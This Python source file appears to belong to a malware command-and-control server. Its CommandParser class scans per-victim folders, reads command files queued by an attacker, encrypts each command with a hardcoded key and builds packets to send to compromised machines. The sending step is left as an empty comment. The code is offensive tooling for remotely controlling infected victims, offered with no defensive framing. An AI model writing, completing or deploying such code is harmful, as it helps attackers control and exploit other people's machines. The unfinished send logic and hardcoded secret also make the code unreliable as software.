"""Module designed to monitor commands issued by attacker to queue
"""
from threading import Thread, Timer
# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
from utils.encrypt import Encrypter
from bundler.bundler import Bundler

import math
import os
import time

class CommandParser():

    def __init__(self, directory, command_file):
        
        self.dir = directory
        self.command_file = command_file
        self.victim_dirs = []

    def parse(self):
        """Watch subdirectories for commands to send to the victims
        """
        # if self.can_watch:
        #     Timer(3, self._watch).start()

        # Refresh victim dirs
        self.victim_dirs = self._get_victim_dirs()

        # Iterate over directories and read command file
        print('called')
        for dir in self.victim_dirs:
            if os.path.isfile(dir + '/input/' + self.command_file):
                bundler = Bundler() # TODO: Pass in victim packet
                with open(dir + '/input/' + self.command_file, 'r') as f:
                    commands = []
                    for line in f:
                        # Encrypt the commands
                        line = line.replace('\n', '')
                        commands.append(Encrypter(line, 'secret').encrypt())

                    # Prepare for transmission
                    for cmd in commands:
                        pkt = bundler.build_command_pkt(cmd)

                        # Send the packet

                # os.remove(dir + '/input/' + self.command_file) # Done reading file

        time.sleep(1000)

    def _get_victim_dirs(self):
        """Get corresponding victims that connected to the server
        """
        res = []
        print(self.dir)
        for victim in os.listdir(self.dir):
            if os.path.isdir(os.path.join(self.dir, victim)):
                res.append(os.path.join(self.dir, victim))

        return res
